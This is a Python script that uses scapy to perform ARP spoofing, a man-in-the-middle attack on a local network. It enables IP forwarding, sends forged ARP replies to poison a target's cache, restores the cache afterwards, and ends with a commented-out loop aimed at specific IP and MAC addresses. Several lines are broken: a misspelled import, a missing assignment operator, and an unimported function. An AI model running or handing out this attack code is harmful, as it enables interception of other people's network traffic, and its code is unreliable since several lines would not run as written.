from scapy.all import Ether, ARP, srp, send
import argsparse
import time
import os
import sys
import uuid 

def _enable_linux_iproute():
	"""
	Enables IP route ( IP Forward ) in linux-based distro
	"""
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			# already enabled
			return
	with open(file_path, "w") as f:
		print(1, file=f)

def enable_ip_route(verbose=True):
	"""
	Enables IP forwarding
	"""
	if verbose:
		print("[!] Enabling IP Routing...")
	_enable_linux_iproute()
	if verbose:
		print("[!] IP Routing enabled.")

def get_mac(ip):
	"""
	Returns MAC address of any device connected to the network
	If ip is down, returns None instead
	"""
	ans, _ srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
	"""
	Spoofs 'target_ip' saying that we are 'host_ip'
	it is accomplished by changing the ARP cache of the target (poisoning)
	"""
	# get the mac address of the target
	target_mac = get_mac(target_ip)
	# craft the arp 'is-at' operation packet, in other words; an ARP response
	# we don't specifiy 'hwsrc' (source MAC address)
	# because by default, 'hwsrc' is the real MAC address of the sender (ours)
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
	# send the packet
	# verbose = 0 means that we send the packet without printing anything
	send(arp_response, verbose=0)
	if verbose:
		# get the MAC address of the default interface we are using
		self_mac = ARP().hwsrc
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
	"""
	Restores the normal process of a regular network
	This is done by sending the original informations
	(real IP and MAC of 'host_ip' ) to 'target_ip'
	"""
	# get the real MAC address of target
	target_mac = get_mac(target_ip)
	# get the real MAC address of spoofed (gateway, i.e router)
	host_mac = get_mac(host_ip)
	# crafting the restoring packet
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
	# sending the restoring packet
	# to restore the network to its normal process
	# we send each reply seven times for a good measure (count=7)
	send(arp_response, verbose=0, count=7)
	if verbose:
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def get_mac_address():
	import uuid
	# after each 2 digits, join elements of getnode().
	print ("The formatted MAC address is : ", end="")
	print (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1]))

	return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1])

def sendPackets(gateway_ip, target_ip, this_mac_address, target_mac_address):
	arp = ARP()
	arp.psrc = gateway_ip
	arp.hwsrc = this_mac_address

	arp = arp
	arp.pdst = target_ip # (say IP address of target machine)
	arp.hwdst = target_mac_address # target mac

	ether = Ether()
	ether.src = this_mac_address
	ether.dst = target_mac_address

	arp.op = 2

	def broadcast():
		packet = ether / arp
		sendp(x=packet, verbose=True)

	broadcast()

# try:
# 	while True:
# 		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
# except KeyboardInterrupt:
# 	rearp = 0
# 	while rearp != 10:
# 		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
# 		time.sleep(0.1)
# 		rearp += 1
